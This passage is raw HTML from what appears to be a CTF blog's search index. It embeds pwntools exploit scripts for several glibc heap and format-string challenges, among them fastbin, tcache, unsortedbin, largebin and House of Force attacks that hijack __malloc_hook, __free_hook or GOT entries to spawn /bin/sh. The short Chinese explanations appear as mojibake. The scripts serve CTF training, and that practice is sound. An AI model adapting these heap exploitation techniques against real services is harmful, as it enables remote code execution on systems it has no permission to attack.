    add(0x60,2,b&amp;quot;ccc&amp;quot;)
    add(0x10,3,b&amp;quot;ddd&amp;quot;)

    # delete(2)

    delete(1)
    delete(0)

    edit(0,b&amp;quot;\x50&amp;quot;)

    # gdb.attach(io)
    # pause()

    add(0x60,4,p64(0)*9+p64(0x71))
    add(0x60,5,p64(0)*3+p64(0xe1))
    # payload=p64(0)*3+p64(0x91)
    # edit(0,payload)

    delete(1)
    # add(0x60,6,b&amp;quot;qqq&amp;quot;)
    # add(0x10,7,b&amp;quot;ttt&amp;quot;)
    delete(0)
    delete(2)

    edit(2,b&amp;quot;\x70&amp;quot;)

    payload=p64(0)*3+p64(0x71)+b&amp;quot;\xdd\x55&amp;quot;
    edit(5,payload)

    add(0x60,7,b&amp;quot;aaa&amp;quot;)
    add(0x60,8,b&amp;quot;bbb&amp;quot;)

    payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1877)+p64(0)*3+b&amp;quot;\x00&amp;quot;
    add(0x60,9,payload)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]   
    print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
    shell=one_gadget[3]+leak_addr
    malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr

    add(0x60,10,b&amp;quot;qqq&amp;quot;)

    delete(0)
    edit(0,p64(malloc_hook-0x23))
    add(0x60,11,b&amp;quot;aaa&amp;quot;)
    add(0x60,12,cyclic(0x13)+p64(shell))

    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;weapon: &amp;quot;,b&amp;quot;24&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,b&amp;quot;13&amp;quot;)

    io.interactive()

while True:
    try:
        shh()
    except:
        io.close()
        continue
# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">de1ctf_2019_weapon wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/Z96YulOXT1/"" data-c="
          &lt;p&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„å†™ï¼Œæ‰“&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;æ³„éœ²libc&lt;br&gt;
ç„¶åå†æ¬¡åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“reallocè°ƒæ ˆçš„one_gadget&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28168)
# io=process(&amp;quot;./note&amp;quot;)
elf=ELF(&amp;quot;./note&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)
    
def fmt(t,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;say ? &amp;quot;,t)
    io.sendlineafter(b&amp;quot;? &amp;quot;,cc)
    
def show():
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)


# gdb.attach(io)
# pause()

payload=p64(0xfbad1887)+p64(0)*3
fmt(b&amp;quot;%7$saaaa&amp;quot;,payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x1430-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226, 0x4527a, 0xf03a4, 0xf1247]
shell=leak_addr+one_gadget[1]

# add(0x90,b&amp;quot;aaa&amp;quot;)
# fmt %7$s

payload=p64(shell)+p64(realloc+0xc)
fmt(b&amp;quot;%7$saaaa&amp;quot;+p64(malloc_hook-0x8),payload)

# add(0x18,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;size: &amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">ç¥¥äº‘æ¯2021 note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/A5pkR-4c0/"" data-c="
          &lt;p&gt;64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œgotè¡¨å¯å†™&lt;br&gt;
ç¬¬ä¸€æ¬¡æ³„éœ²libcåŸºå€å’ŒåŠ«æŒ&lt;code&gt;fini_array&lt;/code&gt;ä¸ºmain&lt;br&gt;
ç¨‹åºè‡ªå¸¦çš„putsé‡Œæœ‰&lt;code&gt;;sh&lt;/code&gt;ï¼Œ&lt;code&gt;;&lt;/code&gt;åˆ†éš”ç¬¦ï¼Œå¦‚æœåŠ«æŒputsçš„gotè¡¨ä¸ºsystemï¼Œåˆ™å¯ä»¥getshell&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./fmtstr_level2&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28540)
elf=ELF(&amp;quot;./fmtstr_level2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

main=0x4011b6
fini_array=0x4031F0

io.recvuntil(b&amp;quot;ID\n&amp;quot;)
payload=b&amp;quot;%38$paaa&amp;quot;+fmtstr_payload(7,{fini_array:main},numbwritten=0x11)
###0x11ä¸ºæ³„éœ²çš„libcåç§»åœ°å€+aaaçš„é•¿åº¦ï¼Œ14+3=17
io.send(payload)

leak_addr=int(io.recv(14),16)-0x1f12e8
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
payload=fmtstr_payload(6,{elf.got[b&amp;quot;puts&amp;quot;]:sys_addr})
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]fmtstr_level2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/IMfIGRuPB/"" data-c="
          &lt;p&gt;2.31&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28245)
io=process(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(s))
    io.sendafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))

for i in range(8):
    add(i,0x90,b&amp;quot;/bin/sh\x00&amp;quot;)

add(8,0x10,b&amp;quot;/bin/sh\x00&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

for i in range(0,10):
    add(i,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)

for i in range(0,7):
    delete(i)

gdb.attach(io)
pause()
    
delete(9)
delete(10)
delete(7)
delete(8)
delete(7)

for i in range(0,7):
    add(i,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
    
add(11,0x60,p64(free_hook))
add(12,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
add(13,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
add(14,0x60,p64(sys_addr))

delete(12)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME2022 oldfashion_note</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/z7v1q0WF_/"" data-c="
          &lt;h3 id=&#34;unsortedbin-attack&#34;&gt;Unsortedbin Attack:&lt;/h3&gt;
&lt;h4 id=&#34;hitcontraining_magicheap&#34;&gt;hitcontraining_magicheap:&lt;/h4&gt;
&lt;p&gt;ä½ç‰ˆæœ¬åˆ©ç”¨ï¼Œæ§åˆ¶bkä½ç½®å†…å®¹ï¼Œå³å¯ä»»æ„åœ°å€å†™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* remove from unsorted list */
if (__glibc_unlikely (bck-&amp;gt;fd != victim))
 malloc_printerr (&amp;quot;malloc(): corrupted unsorted chunks 3&amp;quot;);
unsorted_chunks (av)-&amp;gt;bk = bck;
bck-&amp;gt;fd = unsorted_chunks (av);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27492)
# io=process(&amp;quot;./magicheap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size of Heap : &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content of heap:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size of Heap : &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content of heap : &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0x20,b&amp;quot;aaa&amp;quot;) #0
add(0x90,b&amp;quot;bbb&amp;quot;) #1
add(0x10,b&amp;quot;ccc&amp;quot;) #2

delete(1)
fd=0
bk=0x6020A0
edit(0,0x50,cyclic(0x20)+p64(0)+p64(0x91)+p64(fd)+p64(bk-0x10))
add(0x80,b&amp;quot;zzzz&amp;quot;)
io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4869&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;largebin-attack&#34;&gt;Largebin Attackï¼š&lt;/h3&gt;
&lt;h4 id=&#34;hgame2023_large_note&#34;&gt;hgame2023_large_note:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1687409598772.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#æ³¨æ„0x10å­—èŠ‚å¯¹é½
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28607)
io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x520)
add(1,0x600)
add(2,0x510)

delete(0)
edit(0,b&amp;quot;a&amp;quot;)
show(0)   #uafæ³„éœ²libc

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x61-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_=leak_addr+0x1e3280   #æ­¤å¤„åç§»æ˜¯çœŸçš„éš¾æ‰¾
tc_max_bins=mp_+0x50  #mp_.tcache_bins

edit(0,b&amp;quot;\x00&amp;quot;)
add(13,0x900)   #å°†chunk0åˆ†é…åˆ°largebin

payload=p64(leak_addr+0x1e4030)*2+p64(tc_max_bins-0x20)*2  #æ³¨æ„æ£€æŸ¥ï¼Œä¿®æ”¹chunk 0çš„bk_nextsizeä¸ºtc_max_bins - 0x20å¤„ï¼Œæ¥è¾¾åˆ°ä»»æ„åœ°å€å†™ä¸€ä¸ªå †å—åœ°å€

edit(0,payload)

delete(2) #åˆ†é…chunk2 åˆ°unsortedbin

add(15,0x900) #åˆ†é…ä¸€ä¸ªå¤§å †å—å‡ºå‘largebin attack

# gdb.attach(io)
# pause()

delete(1)
payload=b&amp;quot;a&amp;quot;*0xe8+p64(free_hook) #å›ºå®šåç§»
edit(0,payload)

add(1,0x600) 

edit(1, p64(sys_addr))

add(6,0x600)
edit(6,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(6)  #åŠ«æŒfree_hookä¸ºsystemå‡½æ•°ï¼Œfreeæ‰&amp;quot;/bin/sh&amp;quot;å †å—å³å¯

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Unsortedbin Attack&Largebin Attack</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dDqqLsIMs/"" data-c="
          &lt;h3 id=&#34;ä¾‹é¢˜&#34;&gt;ä¾‹é¢˜ï¼š&lt;/h3&gt;
&lt;h4 id=&#34;hitcon-training-lab-11&#34;&gt;HITCON training lab 11ï¼š&lt;/h4&gt;
&lt;p&gt;2.29ä¹‹å‰ç‰ˆæœ¬åˆ©ç”¨&lt;br&gt;
ä¿®æ”¹top_chunk sizeä¸º&lt;code&gt;-1&lt;/code&gt;æ— ç¬¦å·æº¢å‡ºä¸ºæå¤§å€¼ç»•è¿‡éªŒè¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°
victim = av-&amp;gt;top;
size   = chunksize(victim);
// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚
if ((unsigned long) (size) &amp;gt;= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&amp;gt;top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ¥ä¸‹æ¥æµ‹ç®—åç§»ï¼š&lt;br&gt;
&lt;code&gt;offset = chunk_addr - top_chunk_addr -0x20&lt;/code&gt;&lt;br&gt;
åˆ†é…å †å—&lt;code&gt;add(offset,&#39;&#39;)&lt;/code&gt;åå¯å®ç°&lt;code&gt;chunk_addr&lt;/code&gt;å¤„å†™&lt;br&gt;
æ­¤æ—¶å†æ¬¡&lt;code&gt;add&lt;/code&gt;å³å¯æ”¹å†™å½“å‰åœ°å€å†…å®¹&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27856)
io=process(&amp;quot;./bamboobox&amp;quot;)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(n,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;item:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,str(n))

def getshell():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;5&amp;quot;)

gdb.attach(io)
pause()

add(0x18,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;bbb&amp;quot;) #1
edit(1,0x58,cyclic(0x40)+p64(0)+p64(0xFFFFFFFFFFFFFFFF))

offset=-0x98
magic=0x400d49

add(offset,b&amp;quot;&amp;quot;) #2

add(0x18,p64(magic)*2)
getshell()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥fastbin attackï¼š&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26837)
io=process(&amp;quot;./bamboobox&amp;quot;)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;item:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendafter(b&amp;quot;item:&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

add(0x18,b&amp;quot;e&amp;quot;) #0
add(0x18,b&amp;quot;a&amp;quot;) #1
add(0x90,b&amp;quot;c&amp;quot;) #2
add(0x10,b&amp;quot;d&amp;quot;) #3

edit(0,0x20,cyclic(0x10)+p64(0)+p64(0xc1))
delete(1)
add(0x10,b&amp;quot;aaaaaaaa&amp;quot;)
show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
one_gadget=[0x45206,0x4525a,0xef9f4,0xf0897]
shell=leak_addr+one_gadget[1]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]

add(0x60,b&amp;quot;/bin/sh&amp;quot;)
add(0x20,b&amp;quot;/bin/sh&amp;quot;)
delete(2)
payload=cyclic(0x18)+p64(0x21)+cyclic(0x18)+p64(0x71)+p64(malloc_hook-0x23)
edit(0,len(payload),payload)

add(0x60,b&amp;quot;aaa&amp;quot;)
add(0x60,cyclic(0xb)+p64(shell)+p64(realloc))

io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;name:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x45206 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4525a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xef9f4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf0897 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">House of force</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/Pr8A1aCmZ/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h3&gt;
&lt;h4 id=&#34;fast_note&#34;&gt;fast_note:&lt;/h4&gt;
&lt;p&gt;uaf+fastbin attack,æ­¤é¢˜éœ€è¦reallocè°ƒåç§»æ‰èƒ½æ‰“é€šone_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28391)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x60,b&amp;quot;qqq&amp;quot;) #0
add(1,0x60,b&amp;quot;www&amp;quot;) #1
add(2,0x80,b&amp;quot;eee&amp;quot;) #2
add(3,0x10,b&amp;quot;rrr&amp;quot;) #3

delete(2)
add(4,0x80,b&amp;quot;A&amp;quot;*7+b&amp;quot;b&amp;quot;) #4
show(4)
#0,1,4,3
io.recvuntil(b&amp;quot;b&amp;quot;)
libc_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x58-0x3C4B20
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=libc_addr+one_gadget[3]

# gdb.attach(io)
# pause()

delete(0)
delete(1)
delete(0) #0-&amp;gt;1-&amp;gt;0

add(5,0x60,p64(malloc_hook-0x23))
add(6,0x60,b&amp;quot;aaa&amp;quot;)
add(7,0x60,b&amp;quot;qqq&amp;quot;)
add(8,0x60,cyclic(0xb)+p64(shell)+p64(realloc+0x6))

io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;9&amp;quot;)
io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(0x60))

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;editable_note&#34;&gt;editable_note:&lt;/h3&gt;
&lt;p&gt;tcachebin,uaf+free_hook&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#one_gadgetæ¡ä»¶é™åˆ¶å¤ªå¤šäº†,æ‰“free_hook
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28799)
# io=process(&amp;quot;./vuln&amp;quot;)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
